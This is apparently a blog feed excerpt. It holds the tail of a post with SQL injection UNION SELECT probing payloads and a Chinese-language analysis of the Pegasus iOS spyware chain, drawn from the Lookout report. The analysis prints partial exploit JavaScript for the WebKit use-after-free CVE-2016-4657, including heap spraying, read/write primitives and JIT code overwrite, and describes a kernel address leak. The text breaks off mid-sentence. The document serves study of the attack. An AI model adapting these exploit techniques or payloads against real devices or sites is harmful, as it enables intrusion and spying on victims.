&lt;p&gt;‘ UNION SELECT NULL–&lt;br&gt;‘ UNION SELECT NULL,NULL–&lt;br&gt;‘ UNION SELECT NULL,NULL,NULL–&lt;br&gt;
    
    </summary>
    
    
      <category term="sql" scheme="http://finsenty54.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>pegasus分析</title>
    <link href="http://finsenty54.github.io/2019/04/16/pegasus%E5%88%86%E6%9E%90/"/>
    <id>http://finsenty54.github.io/2019/04/16/pegasus分析/</id>
    <published>2019-04-16T00:54:59.000Z</published>
    <updated>2019-11-18T11:59:16.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PEGASUS攻击分析"><a href="#PEGASUS攻击分析" class="headerlink" title="PEGASUS攻击分析"></a>PEGASUS攻击分析</h1><h6 id="参考-lookout-report"><a href="#参考-lookout-report" class="headerlink" title="参考 lookout report"></a>参考 <a href="https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf" title="lookout report" target="_blank" rel="noopener">lookout report</a></h6><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。</p><h5 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h5><p>传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。</p><h5 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h5><p>越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。</p><a id="more"></a><h5 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h5><p>安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。</p><p>第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。</p><h2 id="CVE-2016-4657"><a href="#CVE-2016-4657" class="headerlink" title="CVE-2016-4657"></a>CVE-2016-4657</h2><p>第一阶段用到了<strong>WebKit’s JavaScriptCore library</strong> 中的漏洞<strong>CVE-2016-4657</strong>。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。</p><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>MarkedArgumentBuffer中的<strong>slowAppend()</strong>函数中存在这个漏洞，并且可以在静态方法<strong>definePropertries()</strong>中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">MarkedArgumentBuffer markBuffer;</span><br><span class="line"><span class="keyword">for</span>(size_t i =<span class="number">0</span>;i&lt;numProperties;i++)&#123;</span><br><span class="line">JSValue prop = properties-&gt;<span class="keyword">get</span>(exec,propertyNames[i]);</span><br><span class="line">if(exec-&gt;hadException())</span><br><span class="line">return jsNull();</span><br><span class="line">PropertyDescriptor descriptor;</span><br><span class="line">if(!toPropertyDescriptor(exec, prop,descriptor))</span><br><span class="line">return jsNull();</span><br><span class="line">descriptors.append(descriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(size_t i=<span class="number">0</span>;i&lt;numProperties; i++)&#123;</span><br><span class="line">Identifier propertyName = propertyNames[i];</span><br><span class="line"><span class="keyword">if</span>(exec-&gt;propertyName().isPrivateName(properName))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了<strong>MarkedArgumentBuffer</strong>，临时存储变量值，防止被回收。</p><p>首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。</p><p>MarkedArgumentBuffer维持一个<strong>inline</strong>栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarkedArgumentBuffer</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">private:</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> size_t inlineCapacity=<span class="number">8</span>;</span><br><span class="line">...</span><br><span class="line">public:</span><br><span class="line">...</span><br><span class="line">MarkedArgumentBuffer()</span><br><span class="line">:m_size(<span class="number">0</span>)</span><br><span class="line">,m_capacity(inlineCapacity)</span><br><span class="line">,m_buffer(m_inlineBuffer)</span><br><span class="line">,m_markSet(<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> append(JSValue v)&#123;</span><br><span class="line"><span class="keyword">if</span>(m_size &gt;= m_capacity)</span><br><span class="line"><span class="keyword">return</span> slowAppend(v);</span><br><span class="line"></span><br><span class="line">slotFor(m_size)=JSValue::encode(v);</span><br><span class="line">++m_size;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">private:</span><br><span class="line">...</span><br><span class="line">int m_size;</span><br><span class="line">int m_capacity;</span><br><span class="line">EncodedJSValue m_inlineBuffer[inlineCapacity];</span><br><span class="line">EncodeedJSValue* m_buffer;</span><br><span class="line">ListSet* m_markSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MarkedArgumentBuffer::slowAppend(JSValue v)&#123;</span><br><span class="line">int newCapacity = m_capacity*<span class="number">4</span>;</span><br><span class="line">EncodedJSValue* newBuffer = <span class="keyword">new</span> EncodeedJSValue[newCapacity];</span><br><span class="line"><span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m_capacity;++i)</span><br><span class="line">newBuffer[i]=m_buffer[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EncodedJSValue* base=mallocBase())</span><br><span class="line"><span class="keyword">delete</span> [] base;</span><br><span class="line"></span><br><span class="line">m_buffer=newBuffer;</span><br><span class="line">m_capacity=newCapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的<strong>m_markListSet</strong>并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动<strong>markListSet</strong>中。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//As long as our size stays within our Vetor's inline</span></span><br><span class="line"><span class="comment">//capacity, all our values are allocated on the stack, and </span></span><br><span class="line"><span class="comment">//therefore don't need explicit marking. Once our size exceeds </span></span><br><span class="line"><span class="comment">//our Vector's inline capacity, though, our values move to the </span></span><br><span class="line"><span class="comment">//heap, where they do need explicit marking.</span></span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;m_size;++i)&#123;</span><br><span class="line">Heap* heap=Heap::heap(JSValue::decode(slotFor(i)));</span><br><span class="line"><span class="keyword">if</span>(!heap)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">m_markSet = &amp;heap-&gt;markListSet();</span><br><span class="line">m_markSet-&gt;add(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inline Heap* Heap::heap(<span class="keyword">const</span> JSValue v)&#123;</span><br><span class="line"><span class="keyword">if</span>(!v.isCell())</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> heap(v.asCell());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>JSValue</strong>有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。<strong>JSValue::isCell() </strong>函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline bool JSValue::isCell() <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(u.asInt64&amp;TagMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。<br><a href="https://imgchr.com/i/ESiMgf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/18/ESiMgf.png" alt="ESiMgf.png"></a><br>调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。</p><h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。</p><h5 id="设置触发漏洞"><a href="#设置触发漏洞" class="headerlink" title="设置触发漏洞"></a>设置触发漏洞</h5><p>攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2047</span>);</span><br><span class="line"><span class="keyword">var</span> not_number=&#123;&#125;;</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">arr=<span class="literal">null</span>;</span><br><span class="line">props[<span class="string">"stale"</span>][<span class="string">'value'</span>]=<span class="literal">null</span>;</span><br><span class="line">...<span class="comment">//Trigger garbage collection and reallocation over stale object</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> props=&#123;</span><br><span class="line">p0:&#123;<span class="attr">value</span>:<span class="number">0</span>&#125;,</span><br><span class="line">p1:&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;,</span><br><span class="line">p2:&#123;<span class="attr">value</span>:<span class="number">2</span>&#125;,</span><br><span class="line">p3:&#123;<span class="attr">value</span>:<span class="number">3</span>&#125;,</span><br><span class="line">p4:&#123;<span class="attr">value</span>:<span class="number">4</span>&#125;,</span><br><span class="line">p5:&#123;<span class="attr">value</span>:<span class="number">5</span>&#125;,</span><br><span class="line">p6:&#123;<span class="attr">value</span>:<span class="number">6</span>&#125;,</span><br><span class="line">p7:&#123;<span class="attr">value</span>:<span class="number">7</span>&#125;,</span><br><span class="line">p8:&#123;<span class="attr">value</span>:<span class="number">8</span>&#125;,</span><br><span class="line">length:&#123;<span class="attr">value</span>:not_number&#125;,</span><br><span class="line">stale:&#123;<span class="attr">value</span>:arr&#125;,</span><br><span class="line">after:&#123;<span class="attr">value</span>:<span class="number">666</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> target=[];</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br></pre></td></tr></table></figure></p><p>经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。</p><p>当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempts=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4250000</span>);</span><br><span class="line"><span class="keyword">var</span> pressure=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line">...</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;pressure.length;i++)&#123;</span><br><span class="line">pressure[i]=<span class="keyword">new</span> Unit32Array(<span class="number">262144</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">80</span>);</span><br><span class="line"><span class="keyword">var</span> unitArray=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">unitArray[<span class="number">0</span>]=<span class="number">0xAABBCCDD</span>;</span><br><span class="line"><span class="keyword">for</span>(i =<span class="number">0</span>;i&lt;attempts.length;i++)&#123;</span><br><span class="line">attempts[i]=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。</p><p>完成后，会检测垃圾回收是否触发。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> before_len=arr.length;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br><span class="line">stale=targets.stale;</span><br><span class="line"><span class="keyword">var</span> after_len=stale.length;</span><br><span class="line"><span class="keyword">if</span>(before_len==after_len)&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> RecoverableException(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。</p><h4 id="获取任意读写原语"><a href="#获取任意读写原语" class="headerlink" title="获取任意读写原语"></a>获取任意读写原语</h4><p>假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。</p><p>攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(x=attempts.length<span class="number">-1</span>;x&gt;=<span class="number">1</span>;x--)&#123;</span><br><span class="line"><span class="keyword">if</span>(attempts[x].length != <span class="number">80</span>/<span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(attempts[x].length==<span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">memory_view=attempts[x];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="获取对象地址"><a href="#获取对象地址" class="headerlink" title="获取对象地址"></a>获取对象地址</h4><p>完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。</p><h4 id="本地代码执行"><a href="#本地代码执行" class="headerlink" title="本地代码执行"></a>本地代码执行</h4><p>Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body=<span class="string">' '</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;<span class="number">0x600</span>;k++)&#123;</span><br><span class="line">body+=<span class="string">'try &#123;&#125; catch(e);'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> to_overwrite=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,body);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。</p><h4 id="回避检测"><a href="#回避检测" class="headerlink" title="回避检测"></a>回避检测</h4><p>当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况会马上认为这个BUG为非法空指针引用而不会怀疑是恶意攻击。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>._proto_._proto_=<span class="literal">null</span>;</span><br><span class="line">x=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"a"</span>);</span><br><span class="line">x._proto_._proto_._proto_=<span class="built_in">window</span>;</span><br><span class="line">x.Audio;</span><br></pre></td></tr></table></figure></p><h2 id="绕过KASLR"><a href="#绕过KASLR" class="headerlink" title="绕过KASLR"></a>绕过KASLR</h2><h3 id="注入的第二阶段：内核位置泄露"><a href="#注入的第二阶段：内核位置泄露" class="headerlink" title="注入的第二阶段：内核位置泄露"></a>注入的第二阶段：内核位置泄露</h3><p>第二阶段依靠一个内核信息泄露漏洞（CVE-2016-4655），为接下来实现越狱的内核存储污染漏洞（CVE-2016-4656）做准备。</p><h3 id="分析KASLR绕过"><a href="#分析KASLR绕过" class="headerlink" title="分析KASLR绕过"></a>分析KASLR绕过</h3><p>阶段二进行提权，为iphone越狱做准备。Pegasus准备了两套方案。方案一为IOS内核爆破。方案二为找出已经越狱的iphone（已经安装了后门程序），利用已存在的后门来安装Pegasus的内核补丁包。</p><p>首先，必须确定内核在内存中的位置，提升自己的权限，解除保护机制，然后安装越狱软件。为了波及更多iphone，Pegasus准备了32位和64位的包。这两个包可以波及大约19个iPhone版本。阶段二的变种在设计上有许多的相似性，但各自的目的不同，所以最好相关又隔离地看待变种。接下来会讲解阶段二变体的每一个部分，并且会指出变种相似的地方。</p><h4 id="32位和63位二进制包不同的地方"><a href="#32位和63位二进制包不同的地方" class="headerlink" title="32位和63位二进制包不同的地方"></a>32位和63位二进制包不同的地方</h4><p>32位包应用于老款的iPhone（iPhone4s–iPhone5c），目标版本为IOS 9.0到IOS 9.3.3。64位应用于新款iPhone（iPhone5s–最新款），目标版本也是IOS 9.0到IOS 9.3.3。两个二进制包执行类似的步骤，利用相同的漏洞。但是，利用漏洞的方式因版本的不同而不同。在运行机制不同的地方，进行分别各自的处理。</p><h4 id="加载API"><a href="#加载API" class="headerlink" title="加载API"></a>加载API</h4><p>想要阶段二成功，需要获得大量的API函数。为保证函数可用，阶段二通过<strong>dlsym</strong>动态加载需要的API地址。虽然动态读取API地址在恶意软件上很常见，但有趣的是制作者多次重复加载许多的API函数。仅在<strong>main</strong>函数上，加载了大量的API地址，但只使用一小部分的API（例如，<strong>socket</strong>函数加载到了内存中，却一直没有使用）。在加载了初期的API函数后，32位包调用了一个子进程（初始化），这个进程又会轮流调用其他几个子进程，每个进程负责加载其他的API函数，除此之外，执行不同的启动项任务。</p><p>分类加载API函数（哪个阶段二函数会加载哪个API函数），还有重复加载大量API，表明加载API是一些独立组件或者操作独有的。例如，一些函数负责解压越狱文件，利用<strong>chmod</strong>改变权限，将文件放在受害者iPhone上正确的地方。一个独立函数会加载执行这些操作的API函数。这个函数只会加载那些有用的API，而这些API不会和阶段二其他部分共享。</p><p>由于在整个二进制文件中大量使用调试日志，阶段二的分析也变得更加容易。对日志记录子系统的调用通常引用漏洞开发人员使用的原始文件名。这些调试代码的出现至少表明有以下独立模块（或子系统）存在：</p><ol><li><strong>fs.c</strong> 加载跟文件还有文件系统操作方法例如<em>ftw,open,read,rename,mount</em>有关的API</li><li><strong>kaslr.c</strong> 加载API，如<em>IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService</em>，通过利用<em>io _ service _ open _ extended</em>函数中的漏洞，这些API来找到内核地址。</li><li><strong>bh.c </strong> 加载与下个阶段payloads相关的API，以及与放置文件正确位置相关的API，如 <em>BZ2 _ bzDecompress, chmod, and malloc</em></li><li><strong>safari.c </strong> 加载如<em>sync, exit, strcpy</em>API，这些API用来清除Safari缓存文件以及终止进程。当攻击完成且完全退出后，这些清除工作才会开始，所以Safari崩溃清除（阶段一中说明的）就不会发生。</li></ol><p>上述部分说明阶段二是基于模块化理念设计的，至少，由不同代码源文件组成。这些不同成分很可能在iOS攻击链中可重复使用。</p><h4 id="环境设置和平台确定"><a href="#环境设置和平台确定" class="headerlink" title="环境设置和平台确定"></a>环境设置和平台确定</h4><p>在初始化完成后，阶段二调用了一个全局回调函数，因错误阶段二终止时就会调用这个函数。根据写入器中的文件名，这个函数可能是一个断言样式回调。</p><p>为了确定受害者设备的型号，调用了<em>sysctlbyname</em>获得<em>hw.machine</em>。另一个对<em>sysctlbyname</em>获取<em>kern.osversion </em>信息。完成这两项后，阶段二可以精确确定型号和iOS 内核版本。根据这两个信息，找到定义不同内存偏移量的数据库，阶段二依据这个库来爆破设备。如果阶段二找不到适合设备的数据库，进程会执行这个断言回调并退出。</p><p>阶段二在运行时使用一个锁定文件。作为运行环境设置的一部分，阶段二为这个文件创建文件名和全局目录变量–<em>$HOME/tmp/lock</em>（注意：<em>$HOME</em>是一个程序独有变量）</p><p>32位包支持100个手机型号和iOS版本组合项。同样，64位包支持99个手机型号和iOS版本组合项。</p><h4 id="攻入KASLR"><a href="#攻入KASLR" class="headerlink" title="攻入KASLR"></a>攻入KASLR</h4><p>阶段二的大部分功能是用来操纵内核以使受害设备防御系统失效。想要控制内核，必须先知道内核的位置。因为iOS使用的KASLR机制，通常情况下内核会映射到一随机地址。KASLR在用户每一次开机后将内核映射到一伪随机地址来阻止进程定位内存中内核地址。要找到内核，阶段二必须找到办法将内核空间的一个地址暴露到用户内存空间中。阶段二利用<strong>CVE-2016-4655</strong>找到内核空间中的一个内存地址。</p><p>阶段二首先在IOKit 子系统上开放了一个端口来找到内核。如果失败，调用断言回调并退出。阶段二创建了一个叫<strong>AppleKeyStore</strong>的服务并调用<strong>IOServiceMatching</strong>，调用结果返回到<strong>IOServiceGetMatchingService </strong>，得到<strong>io _ service _ t</strong>对象，这个对象包含攻击者想要的已注册的IOKit IOService（即 